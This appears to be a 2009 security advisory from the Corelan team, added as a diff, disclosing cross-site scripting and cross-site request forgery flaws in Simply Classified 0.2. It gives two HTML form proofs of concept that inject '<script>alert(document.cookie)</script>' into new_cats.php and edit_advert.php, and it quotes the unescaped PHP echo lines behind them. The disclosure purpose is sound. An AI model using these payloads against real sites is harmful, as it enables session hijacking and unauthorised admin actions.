@@ -1,0 +1,71 @@
+#################################################################
+#
+# Simply Classified 0.2 XSS & CSRF Vulnerabilities
+# Found by: mr_me
+# Tested On: Windows Vista
+# Note: For educational purposes only
+# Author contact date: 16th December 2009
+# Advisory: http://www.corelan.be:8800/index.php/forum/security-advisories/corelan-10-002-simply-classifieds-v0.2-xss-and-csrf/
+# Greetz to: corelanc0d3r, rick2600, ekse & MarkoT from Corelan Team
+#
+#################################################################
+
+|------------------------------------------------------------------|
+|                         __               __                      |
+|   _________  ________  / /___ _____     / /____  ____ _____ ___  |
+|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |
+| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |
+| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |
+|                                                                  |
+|                                       http://www.corelan.be:8800 |
+|                                              security@corelan.be |
+|                                                                  |
+|-------------------------------------------------[ EIP Hunters ]--|
+
+-------------------------------------------------------------------
+[+] 1st exploit:
+-------------------------------------------------------------------
+
+<form name="new_category" action="http://[server]/classified/new_cats.php" method="POST">
+<table align="center" width="550" border="0" cellspacing="1" cellpadding="1">
+      <tr>
+        <input name="category"  type="hidden" value="hacked" size="37" maxlength="30" />
+      </tr>
+      <tr>
+          <input name="description" type="hidden" value="<script>alert(document.cookie)</script>" size="40" maxlength="40" />
+    </tr>
+    <tr>
+        <input type="submit" name="Create" id="Create" value="Create" >
+    </tr>
+</table>
+</form>
+
+-------------------------------------------------------------------
+[+] Vulnerability details:
+-------------------------------------------------------------------
+
+The author directly includes user controlled php variable into the HTML page ($ar and $description).
+
+edit_cats.php - line 86:
+<td align="center">Description: 
+    <input name="description" type="text" value="<?php echo "$description";?>" autocomplete="off" size="40" maxlength="40" />
+    </td>
+</tr>
+    
+    
+edit_adverts.php - line 120:
+<td colspan="2" align="center" style="font-size:14px"><?php echo "<b>$ar</b>"; ?> </td>
+
+
+In order to trigger the vulnerability, a user/admin must be tricked into clicking on a malicous url.
+This would allow a hacker to execute javascript code in the context of the user/admin and possibly gain administration access.
+
+-------------------------------------------------------------------
+[+] 2nd exploit:
+-------------------------------------------------------------------
+
+<form name="get_advert" action="http://[server]/classified/edit_advert.php" method="post">
+    <select name="advert_no" size="1">
+        <option value="<script>alert(document.cookie)</script>">editme :)
+<input type="submit" name="Go" id="Go" value="Go" >
+</form>
